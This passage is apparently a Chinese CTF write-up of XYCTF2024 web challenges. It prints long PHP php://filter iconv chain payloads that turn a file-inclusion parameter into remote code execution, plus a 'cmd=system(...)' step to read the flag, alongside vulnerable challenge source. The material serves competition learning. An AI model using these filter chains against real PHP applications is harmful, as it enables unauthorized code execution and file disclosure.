<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250519150052097.png" alt="image-20250519150052097"></p>
<p>成功RCE，那就试着写马</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET:</span><br><span class="line">?file=php://filter/convert.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.UTF8.UTF16|<span class="type">convert</span>.iconv.WINDOWS<span class="number">-1258.</span>UTF32LE|<span class="type">convert</span>.iconv.ISIRI3342.ISO-IR<span class="number">-157</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.ISO2022KR.UTF16|<span class="type">convert</span>.iconv.L6.UCS2|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.865</span>.UTF16|<span class="type">convert</span>.iconv.CP901.ISO6937|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CSA_T500.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.CP857.ISO<span class="number">-2022</span>-JP<span class="number">-3</span>|<span class="type">convert</span>.iconv.ISO2022JP2.CP775|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.IBM891.CSUNICODE|<span class="type">convert</span>.iconv.ISO8859<span class="number">-14.</span>ISO6937|<span class="type">convert</span>.iconv.BIG-FIVE.UCS<span class="number">-4</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.UTF8.UTF16LE|<span class="type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.iconv.UCS2.UTF8|<span class="type">convert</span>.iconv<span class="number">.8859</span>_3.UCS2|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L5.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.ISO88594.GB13000|<span class="type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.BIG5HKSCS.UTF16|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.864</span>.UTF32|<span class="type">convert</span>.iconv.IBM912.NAPLPS|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP869.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.MACUK.UCS4|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L5.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.ISO88594.GB13000|<span class="type">convert</span>.iconv.CP949.UTF32BE|<span class="type">convert</span>.iconv.ISO_69372.CSIBM921|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP869.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.MACUK.UCS4|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.ISO88597.UTF16|<span class="type">convert</span>.iconv.RK1048.UCS<span class="number">-4</span>LE|<span class="type">convert</span>.iconv.UTF32.CP1167|<span class="type">convert</span>.iconv.CP9066.CSUCS4|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.iconv.CSA_T500.L4|<span class="type">convert</span>.iconv.ISO_8859<span class="number">-2.</span>ISO-IR<span class="number">-103</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.iconv.CSA_T500<span class="number">-1983.</span>UCS<span class="number">-2</span>BE|<span class="type">convert</span>.iconv.MIK.UCS2|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="type">convert</span>.iconv.ISO-IR<span class="number">-156.</span>JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L5.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.ISO88594.GB13000|<span class="type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.863</span>.UNICODE|<span class="type">convert</span>.iconv.ISIRI3342.UCS4|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.JS.UNICODE|<span class="type">convert</span>.iconv.L4.UCS2|<span class="type">convert</span>.iconv.UCS<span class="number">-4</span>LE.OSF05010001|<span class="type">convert</span>.iconv.IBM912.UTF<span class="number">-16</span>LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.MAC.UTF16|<span class="type">convert</span>.iconv.L8.UTF16BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP367.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.CP1361|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L5.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.ISO88594.GB13000|<span class="type">convert</span>.iconv.CP949.UTF32BE|<span class="type">convert</span>.iconv.ISO_69372.CSIBM921|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.iconv.CSA_T500<span class="number">-1983.</span>UCS<span class="number">-2</span>BE|<span class="type">convert</span>.iconv.MIK.UCS2|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM921.NAPLPS|<span class="type">convert</span>.iconv<span class="number">.855</span>.CP936|<span class="type">convert</span>.iconv.IBM<span class="number">-932.</span>UTF<span class="number">-8</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.8859</span>_3.UTF16|<span class="type">convert</span>.iconv<span class="number">.863</span>.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP1046.UTF16|<span class="type">convert</span>.iconv.ISO6937.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP1046.UTF32|<span class="type">convert</span>.iconv.L6.UCS<span class="number">-2</span>|<span class="type">convert</span>.iconv.UTF<span class="number">-16</span>LE.T<span class="number">.61</span><span class="number">-8</span>BIT|<span class="type">convert</span>.iconv<span class="number">.865</span>.UCS<span class="number">-4</span>LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.MAC.UTF16|<span class="type">convert</span>.iconv.L8.UTF16BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="type">convert</span>.iconv.ISO-IR<span class="number">-156.</span>JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.iconv.IBM932.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.base64-decode/resource=php://temp</span><br><span class="line"></span><br><span class="line">POST:</span><br><span class="line">cmd=system(&#x27;cat /flag&#x27;);</span><br></pre></td></tr></table></figure>

<p>但是发现读取flag没读出来，看到一个readflag，运行一下</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">cmd</span>=system(<span class="string">&#x27;/readflag&#x27;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>

<p>然后就读出来了</p>
<p>后来发现readflag是一个c文件，这个文件可以读取并输出flag的值，所以直接运行就完事了</p>
<h2 id="连连看到底是连连什么看"><a href="#连连看到底是连连什么看" class="headerlink" title="连连看到底是连连什么看"></a>连连看到底是连连什么看</h2><p>点击about看到一个参数file，测一下&#x2F;etc&#x2F;passwd看看有没有任意文件读取，发现出来一个文件what’s_this.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|=|php|file|:|\/|\?/i&quot;</span>, <span class="variable">$p</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;waf!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$payload</span>=<span class="string">&quot;php://filter/<span class="subst">$p</span>/resource=/etc/passwd&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$payload</span>)===<span class="string">&quot;XYCTF&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>其实和刚刚的题目一样的，用脚本生成一下XYCTF</p>
<p>但是发现这里的强比较，以为着我们必须让内容完全为XYCTF</p>
<p>原先的payload</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=convert.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP367.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM901.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.CP1361|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.IBM860.UTF16|<span class="type">convert</span>.iconv.ISO-IR<span class="number">-143.</span>ISO2022CNEXT|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.iconv.IBM932.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP-AR.UTF16|<span class="type">convert</span>.iconv<span class="number">.8859</span>_4.BIG5HKSCS|<span class="type">convert</span>.iconv.MSCP1361.UTF<span class="number">-32</span>LE|<span class="type">convert</span>.iconv.IBM932.UCS<span class="number">-2</span>BE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L5.UTF<span class="number">-32</span>|<span class="type">convert</span>.iconv.ISO88594.GB13000|<span class="type">convert</span>.iconv.CP950.SHIFT_JISX0213|<span class="type">convert</span>.iconv.UHC.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.base64-decode/resource=php://temp</span><br></pre></td></tr></table></figure>

<p><img src="/../image/achieve/202411/XYCTF2024/image-20250519151308336.png" alt="image-20250519151308336"></p>
<p>算了看不懂，看别人的wp吧</p>
<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=convert.base64-decode|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.CSISO2022KR|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CSIBM1161.UNICODE|<span class="type">convert</span>.iconv.ISO-IR<span class="number">-156.</span>JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.8859</span>_3.UTF16|<span class="type">convert</span>.iconv<span class="number">.863</span>.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.INIS.UTF16|<span class="type">convert</span>.iconv.CSIBM1133.IBM943|<span class="type">convert</span>.iconv.IBM932.SHIFT_JISX0213|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.PT.UTF32|<span class="type">convert</span>.iconv.KOI8-U.IBM<span class="number">-932</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.BIG5HKSCS.UTF16|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.JS.UNICODE|<span class="type">convert</span>.iconv.L4.UCS2|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.SE2.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.CSIBM1161.IBM<span class="number">-932</span>|<span class="type">convert</span>.iconv.MS932.MS936|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L6.UNICODE|<span class="type">convert</span>.iconv.CP1282.ISO-IR<span class="number">-90</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv<span class="number">.863</span>.UNICODE|<span class="type">convert</span>.iconv.ISIRI3342.UCS4|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.ISO88597.UTF16|<span class="type">convert</span>.iconv.RK1048.UCS<span class="number">-4</span>LE|<span class="type">convert</span>.iconv.UTF32.CP1167|<span class="type">convert</span>.iconv.CP9066.CSUCS4|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.L4.UTF32|<span class="type">convert</span>.iconv.CP1250.UCS<span class="number">-2</span>|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP1046.UTF32|<span class="type">convert</span>.iconv.L6.UCS<span class="number">-2</span>|<span class="type">convert</span>.iconv.UTF<span class="number">-16</span>LE.T<span class="number">.61</span><span class="number">-8</span>BIT|<span class="type">convert</span>.iconv<span class="number">.865</span>.UCS<span class="number">-4</span>LE|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.iconv.CP950.UTF16|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.iconv.CP861.UTF<span class="number">-16</span>|<span class="type">convert</span>.iconv.L4.GB13000|<span class="type">convert</span>.iconv.BIG5.JOHAB|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-encode|<span class="type">convert</span>.iconv.UTF8.UTF7|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-decode|<span class="type">convert</span>.base64-decode</span><br></pre></td></tr></table></figure>

<h2 id="give-me-flag"><a href="#give-me-flag" class="headerlink" title="give me flag"></a>give me flag</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="variable">$FLAG_md5</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>]) || !<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="variable">$FLAG_md5</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$value</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;value&#x27;</span>];</span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$FLAG</span>.<span class="variable">$value</span>.<span class="variable">$time</span>)===<span class="variable">$md5</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;yes, give you flag: &quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$FLAG</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="number">31</span>b81f48a29befbbe01d322512a8a100</span><br></pre></td></tr></table></figure>

